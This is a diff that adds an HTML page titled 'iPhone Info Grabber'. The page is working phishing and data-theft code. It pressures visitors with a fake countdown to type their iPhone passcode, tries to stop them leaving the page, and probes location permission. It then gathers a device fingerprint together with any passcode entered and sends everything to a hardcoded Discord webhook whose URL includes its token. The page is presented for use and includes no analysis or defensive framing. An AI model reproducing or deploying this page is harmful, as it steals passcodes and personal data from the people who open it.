@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Info Grabber</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        #container {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffeb3b;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>📱 iPhone Information Required</h1>
+        <p>Please enter your device password to continue...</p>
+        <div class="countdown" id="countdown">5</div>
+        <p>Auto-continuing without password in 5 seconds...</p>
+    </div>
+
+    <script>
+        let passwordEntered = false;
+        let countdownValue = 5;
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Prevent user from closing the tab
+            window.onbeforeunload = function() {
+                return "Device information is required to proceed!";
+            };
+
+            // Check if the device is an iPhone
+            const isIPhone = /iPhone|iPad|iPod/.test(navigator.userAgent);
+            if (!isIPhone) {
+                alert("This page is only for iPhone users.");
+                return;
+            }
+
+            // Countdown timer
+            const countdownElement = document.getElementById('countdown');
+            const countdownInterval = setInterval(function() {
+                countdownValue--;
+                countdownElement.textContent = countdownValue;
+                
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    if (!passwordEntered) {
+                        document.getElementById('container').innerHTML = '<h1>⏱️ Time expired</h1><p>Continuing without password...</p>';
+                        setTimeout(getDeviceInfo, 1000);
+                    }
+                }
+            }, 1000);
+
+            // Show password prompt immediately
+            setTimeout(function() {
+                const password = prompt("📱 Enter your iPhone passcode:");
+                if (password) {
+                    passwordEntered = true;
+                    clearInterval(countdownInterval);
+                    document.getElementById('container').innerHTML = '<h1>✅ Password received</h1><p>Processing device information...</p>';
+                    setTimeout(() => getDeviceInfo(password), 1000);
+                }
+            }, 500);
+
+            // Request permissions in background
+            navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                if (result.state === 'granted') {
+                    console.log("Location permission granted");
+                } else if (result.state === 'prompt') {
+                    result.onchange = function() {
+                        if (result.state === 'granted') {
+                            console.log("Location permission granted");
+                        }
+                    };
+                }
+            });
+        });
+
+        function getDeviceInfo(password = null) {
+            document.getElementById('container').innerHTML = '<h1>🔍 Scanning device...</h1><p>Please wait...</p>';
+            
+            // Collect device information
+            const deviceInfo = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                onlineStatus: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                connection: {
+                    effectiveType: navigator.connection?.effectiveType || 'Unknown',
+                    downlink: navigator.connection?.downlink || 'Unknown',
+                    rtt: navigator.connection?.rtt || 'Unknown'
+                }
+            };
+
+            // Add battery info if available
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    deviceInfo.battery = {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                });
+            }
+
+            // Add password if provided
+            if (password) {
+                deviceInfo.phonePassword = password;
+            }
+
+            // Send to Discord webhook
+            fetch('https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `📱 **iPhone Device Information**\n\n\`\`\`json\n${JSON.stringify(deviceInfo, null, 2)}\n\`\`\``,
+                    username: "📱 iPhone Scanner",
+                    avatar_url: "https://i.imgur.com/7FhT2R2.png"
+                })
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('container').innerHTML = '<h1>✅ Complete</h1><p>Device information sent successfully!</p>';
+                } else {
+                    document.getElementById('container').innerHTML = '<h1>❌ Error</h1><p>Failed to send information.</p>';
+                }
+            }).catch(error => {
+                document.getElementById('container').innerHTML = '<h1>❌ Network Error</h1><p>Check your connection.</p>';
+            });
+        }
+    </script>
+</body>
+</html>
